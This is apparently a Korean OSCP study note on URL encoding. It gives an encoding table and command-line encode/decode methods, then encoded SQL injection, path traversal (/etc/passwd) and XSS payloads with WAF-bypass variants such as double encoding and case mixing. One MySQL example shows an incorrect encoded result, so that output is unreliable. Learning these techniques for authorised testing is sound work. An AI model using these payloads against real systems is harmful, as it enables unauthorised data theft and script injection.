# URL 인코딩 및 디코딩

OSCP 시험 중 웹 취약점을 이용한 침투 테스트에서 URL 인코딩과 디코딩은 매우 중요합니다. 특히 SQL 인젝션, XSS, 경로 순회(Path Traversal) 등의 공격을 수행할 때 필요합니다.

## 자주 사용되는 특수문자 URL 인코딩 표

| 문자 | URL 인코딩 |
| ---- | ---------- |
| 공백 | %20        |
| !    | %21        |
| "    | %22        |
| #    | %23        |
| $    | %24        |
| %    | %25        |
| &    | %26        |
| '    | %27        |
| (    | %28        |
| )    | %29        |
| \*   | %2A        |
| +    | %2B        |
| ,    | %2C        |
| -    | %2D        |
| .    | %2E        |
| /    | %2F        |
| <    | %3C        |
| >    | %3E        |
| :    | %3A        |
| ;    | %3B        |
| =    | %3D        |
| ?    | %3F        |
| @    | %40        |
| [    | %5B        |
| \    | %5C        |
| ]    | %5D        |
| ^    | %5E        |
| `    | %60        |
| {    | %7B        |
| \|   | %7C        |
| }    | %7D        |
| ~    | %7E        |

## 터미널에서 URL 인코딩/디코딩하기

### 1. cURL을 이용한 방법

```bash
# URL 인코딩
curl -s -o /dev/null -w "%{url_effective}" --get --data-urlencode "param=값 특수문자!@#" "http://example.com" | cut -c 20-

# 결과: param=%EA%B0%92%20%ED%8A%B9%EC%88%98%EB%AC%B8%EC%9E%90%21%40%23
```

### 2. Python을 이용한 방법

```bash
# URL 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote('값 특수문자!@#'))"
# 결과: %EA%B0%92%20%ED%8A%B9%EC%88%98%EB%AC%B8%EC%9E%90%21%40%23

# URL 디코딩
python3 -c "import urllib.parse; print(urllib.parse.unquote('%EA%B0%92%20%ED%8A%B9%EC%88%98%EB%AC%B8%EC%9E%90%21%40%23'))"
# 결과: 값 특수문자!@#

# 전체 쿼리스트링 파싱
python3 -c "import urllib.parse; print(urllib.parse.parse_qs('param1=value1&param2=%EA%B0%92'))"
# 결과: {'param1': ['value1'], 'param2': ['값']}
```

### 3. Perl을 이용한 방법

```bash
# URL 인코딩
perl -MURI::Escape -e 'print uri_escape("값 특수문자!@#");'
# 결과: %EA%B0%92%20%ED%8A%B9%EC%88%98%EB%AC%B8%EC%9E%90%21%40%23

# URL 디코딩
perl -MURI::Escape -e 'print uri_unescape("%EA%B0%92%20%ED%8A%B9%EC%88%98%EB%AC%B8%EC%9E%90%21%40%23");'
# 결과: 값 특수문자!@#
```

### 4. jq를 이용한 방법 (JSON 데이터 처리 시 유용)

```bash
# 설치가 필요할 경우: apt-get install jq

# URL 인코딩
echo -n "값 특수문자!@#" | jq -sRr @uri
# 결과: "%EA%B0%92%20%ED%8A%B9%EC%88%98%EB%AC%B8%EC%9E%90!%40%23"
```

## 웹 페이로드에서의 활용

### SQL 인젝션에서의 활용

```bash
# 기본 SQL 인젝션 페이로드 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR 1=1 --\"))"
# 결과: %27%20OR%201%3D1%20--

# 더블 인코딩 (IDS/WAF 우회에 유용)
python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote(\"' OR 1=1 --\")))"
# 결과: %2527%2520OR%25201%253D1%2520--

# UNION 기반 SQL 인젝션 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' UNION SELECT username,password FROM users --\"))"
# 결과: %27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users%20--

# 공백 우회 인코딩 (%09=탭, %0A=줄바꿈, %0B=수직탭, %0C=폼피드, %0D=캐리지리턴)
python3 -c "import urllib.parse; print(urllib.parse.quote(\"'/**/OR/**/1=1/**/--\"))"
# 결과: %27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%2F%2A%2A%2F--

# 주석 처리 방식을 다양하게 활용한 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote(\"'OR 1=1;#\"))"
# 결과: %27OR%201%3D1%3B%23

# 문자열 연결 함수를 이용한 우회 인코딩 (MySQL)
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR 'a'='a\"))"
# 결과: %27%20OR%20%27a%27%3D%27a
```

### 데이터베이스별 SQL 인젝션 인코딩 특징

#### MySQL

```bash
# 공백 대체 문자 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote(\"'%09OR%091=1%09--\"))"
# 결과: %27%09OR%091%3D1%09--

# 주석 처리 인코딩 (MySQL)
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR 1=1 -- -\"))"
# 결과: %27%20OR%201%3D1%20--%20-
```

#### MSSQL

```bash
# MSSQL 주석 처리 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR 1=1 --\"))"
# 결과: %27%20OR%201%3D1%20--

# 공백 대체 및 16진수 표기법 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote(\"'/**/OR/**/0x74727565/**/--\"))"
# 결과: %27%2F%2A%2A%2FOR%2F%2A%2A%2F0x74727565%2F%2A%2A%2F--
```

#### Oracle

```bash
# Oracle 주석 처리 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR 1=1 --\"))"
# 결과: %27%20OR%201%3D1%20--

# Oracle DUAL 테이블 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' UNION SELECT NULL,username,password FROM all_users --\"))"
# 결과: %27%20UNION%20SELECT%20NULL%2Cusername%2Cpassword%20FROM%20all_users%20--
```

### SQL 인젝션 필터 우회를 위한 인코딩 기법

```bash
# 키워드 대체 인코딩 (SELECT -> SeLeCt)
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' UnIoN SeLeCt username,password FrOm users --\"))"
# 결과: %27%20UnIoN%20SeLeCt%20username%2Cpassword%20FrOm%20users%20--

# 16진수 인코딩을 활용한 우회
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR 0x31=0x31 --\"))"
# 결과: %27%20OR%200x31%3D0x31%20--

# 인라인 주석을 사용한 키워드 분리 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' UN/**/ION/**/SE/**/LECT username,password FROM users --\"))"
# 결과: %27%20UN%2F%2A%2A%2FION%2F%2A%2A%2FSE%2F%2A%2A%2FLECT%20username%2Cpassword%20FROM%20users%20--
```

### 경로 순회(Path Traversal) 공격에서의 활용

```bash
# 기본 경로 순회 페이로드 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote('../../../etc/passwd'))"
# 결과: ..%2F..%2F..%2Fetc%2Fpasswd

# 더블 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('../../../etc/passwd')))"
# 결과: ..%252F..%252F..%252Fetc%252Fpasswd
```

### XSS 공격에서의 활용

```bash
# 기본 XSS 페이로드 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))"
# 결과: %3Cscript%3Ealert%281%29%3C%2Fscript%3E

# 더블 인코딩 (WAF 우회에 유용)
python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('<script>alert(1)</script>')))"
# 결과: %253Cscript%253Ealert%25281%2529%253C%252Fscript%253E

# HTML 엔티티 + URL 인코딩을 사용한 우회 기법
python3 -c "import urllib.parse; print(urllib.parse.quote('&lt;script&gt;alert(1)&lt;/script&gt;'))"
# 결과: %26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B
```

### 중요 인코딩 우회 테크닉

웹 애플리케이션 방화벽(WAF)이나 입력 필터를 우회하기 위한 일반적인 테크닉:

```bash
# HTML 이벤트 핸들러 인코딩
python3 -c "import urllib.parse; print(urllib.parse.quote('<img src=x onerror=alert(1)>'))"
# 결과: %3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E

# 대소문자 혼합 인코딩 (필터 우회)
python3 -c "import urllib.parse; print(urllib.parse.quote('<ScRiPt>alert(1)</sCrIpT>'))"
# 결과: %3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E

# 자바스크립트 인코딩 예시
python3 -c "import urllib.parse; print(urllib.parse.quote('javascript:alert(1)'))"
# 결과: javascript%3Aalert%281%29
```

## 실시간 인코딩/디코딩 도구

### Burp Suite

OSCP 시험 환경에서는 Burp Suite를 사용할 수 있으며, Burp Suite의 Decoder 기능을 활용하면 실시간으로 인코딩/디코딩을 수행할 수 있습니다.

1. **Decoder 탭 사용법**:

   - Burp Suite > Decoder 탭으로 이동
   - 인코딩/디코딩할 텍스트 입력
   - "Encode as" 또는 "Decode as" 옵션 선택 (URL, HTML, Base64, ASCII Hex 등)

2. **Proxy를 통한 자동 인코딩**:
   - Burp Suite > Proxy > Intercept로 요청 캡처
   - 패킷 수정 시 자동으로 URL 인코딩 적용 옵션 사용

### CyberChef

OSCP 시험에서 오프라인으로 사용 가능한 CyberChef 도구를 통해 다양한 인코딩/디코딩 작업을 수행할 수 있습니다.

```bash
# 시험 전 미리 CyberChef를 다운로드하여 준비
wget https://github.com/gchq/CyberChef/releases/download/v9.49.0/CyberChef_v9.49.0.zip
unzip CyberChef_v9.49.0.zip
firefox CyberChef_v9.49.0.html
```

## URL 인코딩 우회 팁

### 1. 다양한 인코딩 조합 시도

WAF나 필터를 우회하기 위해 여러 인코딩 방식을 조합하여 사용합니다:

```bash
# 이중 URL 인코딩
%253E # '>' 문자의 이중 인코딩

# URL 인코딩 + 16진수 인코딩
%3C%73%63%72%69%70%74%3E # <script>

# 대소문자 혼합
%3CsCrIpT%3E # <script>
```

### 2. 문자 인코딩 변형

ASCII 외의 다른 인코딩을 사용하여 필터를 우회할 수 있습니다:

```bash
# UTF-8 인코딩 예시
python3 -c "print('\\u003cscript\\u003ealert(1)\\u003c/script\\u003e')"
```

### 3. OSCP 시험에서 URL 인코딩 활용 전략

1. **침투 테스트 단계에서 주기적으로 인코딩 시도**

   - 일반 입력 시도 후 실패 시 URL 인코딩 버전 시도
   - 단일 인코딩 실패 시 이중 인코딩 시도

2. **자동 인코딩이 항상 정확한 것은 아님**
   - 때로는 수동으로 인코딩을 제어해야 할 필요가 있음
   - 특히 특수 문자가 포함된 페이로드의 경우 주의
